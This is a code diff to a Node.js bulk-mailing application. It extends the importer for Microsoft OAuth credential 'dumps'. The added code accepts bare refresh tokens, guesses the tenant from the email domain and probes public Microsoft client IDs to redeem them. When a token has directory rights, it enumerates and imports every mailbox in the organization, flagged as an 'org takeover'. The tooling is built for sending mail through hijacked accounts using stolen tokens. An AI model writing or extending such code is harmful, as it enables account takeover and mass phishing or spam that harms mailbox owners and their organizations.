@@ -10,7 +10,7 @@ import Fastify from 'fastify';
 import fastifyStatic from '@fastify/static';
 import { decryptSecret, encryptSecret, tokensEqual, unsubscribeToken } from './crypto.js';
 import { parseRecipientsCsv, parseLooseEmails } from './csv.js';
-import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, msCcVerifyMailbox, msCcListMailboxes, msRtListOrgMailboxes, msRtListContacts, msCcListContacts } from './mailer.js';
+import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, msTenantFromEmail, msCcVerifyMailbox, msCcListMailboxes, msRtListOrgMailboxes, msRtListContacts, msCcListContacts } from './mailer.js';
 import { escapeHtml } from './placeholders.js';
 import { transaction } from './db.js';
 import { DEFAULT_AI_RULES } from './default-ai-rules.js';
@@ -378,7 +378,14 @@ export async function createApp({ db, config, mailer, worker, emit: emitFn }) {
     } catch (err) {
       fail(`Send failed: ${err.message || err}`, err.statusCode && err.statusCode < 500 ? err.statusCode : 400);
     }
-    return { ok: true, messageId: info?.messageId || '' };
+    if (!info || info.skipped) {
+      fail(`Send skipped: ${info?.reason || 'the engine did not accept the message'}`);
+    }
+    return {
+      ok: true,
+      messageId: info.messageId || '',
+      response: info.response || info.accepted?.join(', ') || 'accepted',
+    };
   });
 
   // ── Gmail OAuth connect flow ──
@@ -1581,7 +1588,12 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
           } catch {}
         }
         if (clientId && secret) return { type: 'cc', clientId, secret, tenant, email: j.email || j.mail || '' };
-        if (clientId && rt) return { type: 'rt', clientId, rt, tenant, email: j.email || j.mail || '' };
+        if (rt) {
+          return {
+            type: 'rt', clientId: clientId || '', rt, tenant: j.tenant || j.tid || '',
+            email: j.email || j.mail || j.username || '', bare: !clientId,
+          };
+        }
         // access-token-only dumps (app/delegated) — nothing renewable to store
         if (j.access_token && !rt) return { clientId, rt: '', tenant, email: '', error: 'access_token only — expires ~1h and has no refresh token; need the refresh_token for import' };
       } catch {}
@@ -1591,23 +1603,33 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     const guids = parts.filter((p) => MS_GUID.test(p));
     const emailPart = parts.find((p) => p.includes('@')) || '';
     const nonGuids = parts.filter((p) => !MS_GUID.test(p) && !p.includes('@'));
-    // two GUIDs → client_id : secret : tenant (app credentials)
+    const longest = nonGuids.slice().sort((a, b) => b.length - a.length)[0] || '';
+    // A refresh token is long and usually starts with 1./0./M. A client secret
+    // is short-ish and has no prefix. This tells the two apart.
+    const looksRt = (s) => /^(1|0|M)\./.test(s) || s.length >= 100;
+    // email : client_id : tenant : refresh_token
+    if (guids.length >= 2 && looksRt(longest)) {
+      return { type: 'rt', clientId: guids[0], rt: longest, tenant: guids[1], email: emailPart };
+    }
+    // two GUIDs + a non-token value → client_id : secret : tenant (app credentials)
     if (guids.length >= 2 && nonGuids.length) {
-      const secret = nonGuids.sort((a, b) => b.length - a.length)[0];
-      if (secret.length >= 10) return { type: 'cc', clientId: guids[0], secret, tenant: guids[1], email: emailPart };
+      if (longest.length >= 10) return { type: 'cc', clientId: guids[0], secret: longest, tenant: guids[1], email: emailPart };
     }
     // one GUID → client_id : refresh_token
     const clientId = guids[0] || '';
-    const rt = nonGuids.sort((a, b) => b.length - a.length)[0] || '';
-    if (!clientId || !rt || rt.length < 20) {
-      // bare ESTS v1 refresh token ("1.xxx…") — no client embedded; bind the
-      // well-known Microsoft Teams public client so it can still redeem.
-      if (/^1\.[A-Za-z0-9._\-]{40,}$/.test(line)) {
-        return { type: 'rt', clientId: '802cdc8f-1d39-4037-b5ef-997f31eaa71b', rt: line, tenant: 'common', email: emailPart };
-      }
-      return null;
+    if (clientId && looksRt(longest)) {
+      return { type: 'rt', clientId, rt: longest, tenant: 'common', email: emailPart };
     }
-    return { type: 'rt', clientId, rt, tenant: 'common', email: emailPart };
+    // bare refresh token ("1.xxx…" or "M.C…") — no client/tenant embedded;
+    // the importer probes the common public clients and, when an email is
+    // supplied, resolves the tenant from its domain.
+    const bare = emailPart && parts.length >= 2
+      ? parts.filter((p) => p !== emailPart).sort((a, b) => b.length - a.length)[0]
+      : line;
+    if (/^([10M])\.[A-Za-z0-9._\-]{40,}$/.test(bare)) {
+      return { type: 'rt', clientId: '', rt: bare, tenant: '', email: emailPart, bare: true };
+    }
+    return null;
   }
 
   const makeMsInserter = (quota) => (authType, clientId, secret, tenant, email, name) => {
@@ -1829,20 +1851,26 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
           }
           continue;
         }
-        const info = await msRtMailboxInfo(parsed.clientId, parsed.rt, parsed.tenant);
-        const sender = parsed.email || info.email;
-        if (!sender) { results.push({ ok: false, error: 'mailbox email not resolvable', line: parsed.clientId }); continue; }
-        const inserted = insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, sender, info.displayName);
+        // Bare RT: resolve the tenant from the mailbox domain (when given) and
+        // let the importer probe the public client ids for a working one.
+        const hintEmail = parsed.email || String(body.email || '').trim();
+        const hintedTenant = String(body.tenant || '').trim();
+        const tenant = parsed.tenant || hintedTenant || (hintEmail ? await msTenantFromEmail(hintEmail) : '');
+        const clientId = parsed.clientId || String(body.clientId || '').trim();
+        const info = await msRtMailboxInfo(clientId, parsed.rt, tenant || 'common');
+        const sender = info.email || hintEmail;
+        if (!sender) { results.push({ ok: false, error: 'mailbox email not resolvable', line: clientId }); continue; }
+        const inserted = insertMsAccount('ms_rt', info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common', sender, info.displayName);
         results.push(inserted);
         // Smart detection — token that can read the org directory is admin-grade:
         // enumerate member mailboxes and import them bound to the same credential.
         if (inserted.ok) {
           try {
-            const org = await msRtListOrgMailboxes(parsed.clientId, parsed.rt, parsed.tenant);
+            const org = await msRtListOrgMailboxes(info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common');
             const extra = org.filter((m) => m.email.toLowerCase() !== sender.toLowerCase());
             if (extra.length) {
               results.push({ ok: true, email: '', name: '', admin: true, note: `admin mailbox detected — org takeover: ${extra.length} more mailbox(es)` });
-              for (const mb of extra) results.push(insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, mb.email, mb.displayName));
+              for (const mb of extra) results.push(insertMsAccount('ms_rt', info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common', mb.email, mb.displayName));
             }
           } catch { /* plain mailbox, no directory rights — fine */ }
         }
